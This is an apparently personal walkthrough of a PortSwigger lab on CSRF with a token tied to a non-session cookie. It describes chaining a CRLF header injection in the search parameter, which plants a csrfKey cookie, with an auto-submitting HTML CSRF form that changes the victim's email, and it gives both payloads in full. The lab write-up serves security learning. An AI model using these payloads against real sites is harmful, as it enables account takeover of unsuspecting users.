# [CSRF where token is tied to non-session cookie] — [PortSwigger] — [Difficulty]
**Date:** 2026-06-09
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
I figured out the vulnerability related to csrf, however, the problem that made me stuck was changing victim's cookie value.
 
## What unblocked me
After using some hint and research, I finally understood how to exploit the vulnerability of this app to change victim's cookie value.
 
---


## Attack path
1) First we need to log in to access email change functionality.
2) After logging in using both accounts wiener and carlos, we can start to test around to see how csrf token works and what is the vulnerability of it.
3) During intercept I noticed that users have two persistent tokens related to csrf: first one was `csrfKey` in the cookie, and second one was a classic csrf token.
4) By using repeater and testing, I noticed that application only checks if user use correct pair of csrfKey and csrf token. That means if we can change victim's cookie csrfKey value to ours and submit for with our csrf token, we will be able to execute csrf attack.
5) Finding how we can change victim's csrfKey cookie value was a little subtle. During recon, I noticed that when we type something in the search bar, it is displayed in cookie header as `LastSearchedItem`. That means we can use encoded `\r\n` -> `%0d%0a` to write a new header in new line. The new header will be `Set-Cookie` header. It will change the cookie value of csrfKey to our desired one.
6) Now, we need to chain these findings in correct order to make it work. We cannot use script submit form as it will execute as soon as page loads without modifying csrfKey value. Therefore, we should use `img` and put source to vulnerable search with our cookie value.
7) Now using csrf PoC generator, we can create the payload and deliver it to victim to complete lab and csrf attack

---


## Payload / key command
The URL that changes victim's cookie:
```bash
https://0adf00ff04a86a2a8027cbed00190083.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=pa5HDfGX2x7KNbfDUNrxz0EuUBB9MgFy%3b%20SameSite=None
```
The payload:
```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="https://0adf00ff04a86a2a8027cbed00190083.web-security-academy.net/my-account/change-email" method="post">
      <input type="hidden" name="email" value="good@good" />
    <input type="hidden" name="csrf" value="mrQQFvdQqXbKxzDkIhOmRuEyuhwBd5zb" />
          <input type="submit" value="Submit request" />
      </form>
        <img src="https://0adf00ff04a86a2a8027cbed00190083.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=pa5HDfGX2x7KNbfDUNrxz0EuUBB9MgFy%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
  </html>
```

---


## What I'd recognize faster next time
It is essential to understand every flaw in the application. There is a chance that we can use that additional flaw to perform a dangerous attack.
 

